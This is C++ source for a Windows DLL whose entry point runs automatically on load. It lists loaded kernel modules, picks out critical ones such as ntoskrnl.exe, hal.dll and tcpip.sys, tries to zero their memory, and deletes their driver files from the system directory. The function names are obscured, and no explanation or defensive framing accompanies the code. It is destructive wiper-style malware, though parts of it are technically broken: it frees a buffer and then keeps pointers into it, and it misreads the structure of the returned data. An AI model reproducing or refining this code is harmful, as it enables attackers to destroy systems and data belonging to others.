#include "pch.h"
#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <string.h>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

NtQuerySystemInformation_t pNtQuerySystemInformation = NULL;

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

typedef struct _SYSTEM_MODULE_INFORMATION_EX {
    ULONG Reserved[2];
    PVOID Base;
    ULONG Size;
    ULONG Flags;
    USHORT Index;
    USHORT Unknown;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    CHAR ImageName[256];
    ULONG CheckSum;
    ULONG NumSections;
    ULONG TimeDateStamp;
} SYSTEM_MODULE_INFORMATION_EX, * PSYSTEM_MODULE_INFORMATION_EX;

std::vector<PSYSTEM_MODULE_INFORMATION_EX> eins() {
    std::vector<PSYSTEM_MODULE_INFORMATION_EX> modules;
    ULONG returnLength;
    PSYSTEM_MODULE_INFORMATION_EX moduleInfo = NULL;
    NTSTATUS status = (*pNtQuerySystemInformation)(static_cast<SYSTEM_INFORMATION_CLASS>(11), NULL, 0, &returnLength);
    if (status == STATUS_INFO_LENGTH_MISMATCH) {
        moduleInfo = (PSYSTEM_MODULE_INFORMATION_EX)malloc(returnLength);
        if (moduleInfo) {
            status = (*pNtQuerySystemInformation)(static_cast<SYSTEM_INFORMATION_CLASS>(11), moduleInfo, returnLength, &returnLength);
            if (NT_SUCCESS(status)) {

                for (ULONG i = 0; i < (returnLength / sizeof(SYSTEM_MODULE_INFORMATION_EX)); i++) {
                    modules.push_back(&moduleInfo[i]);
                }
            }
            free(moduleInfo);
        }
    }
    return modules;
}

void zwei(PVOID DriverBase, ULONG DriverSize) {

    memset(DriverBase, 0, DriverSize);
}

BOOL drei(const CHAR* DriverName) {

    const CHAR* vitalDrivers[] = {
        "ntoskrnl.exe", "hal.dll", "win32k.sys", "tcpip.sys", "ndis.sys",
        "acpi.sys", "atapi.sys", "fltMgr.sys", "ksecdd.sys", "ndproxy.sys",
        "partmgr.sys", "volmgr.sys", "volmgrx.sys", "wdf01000.sys", "wdfldr.sys"
    };
    for (const CHAR* driver : vitalDrivers) {
        if (strstr(DriverName, driver)) {
            return TRUE;
        }
    }
    return FALSE;
}

void vier(const CHAR* DriverName) {
    CHAR systemRoot[MAX_PATH];
    GetSystemDirectoryA(systemRoot, MAX_PATH);
    strcat_s(systemRoot, MAX_PATH, "\\");
    strcat_s(systemRoot, MAX_PATH, DriverName);

    DeleteFileA(systemRoot);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        pNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
        if (pNtQuerySystemInformation) {
            std::vector<PSYSTEM_MODULE_INFORMATION_EX> modules = eins();
            for (PSYSTEM_MODULE_INFORMATION_EX module : modules) {
                if (drei(module->ImageName)) {
                    zwei(module->Base, module->Size);
                    vier(module->ImageName);
                }
            }
        }
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}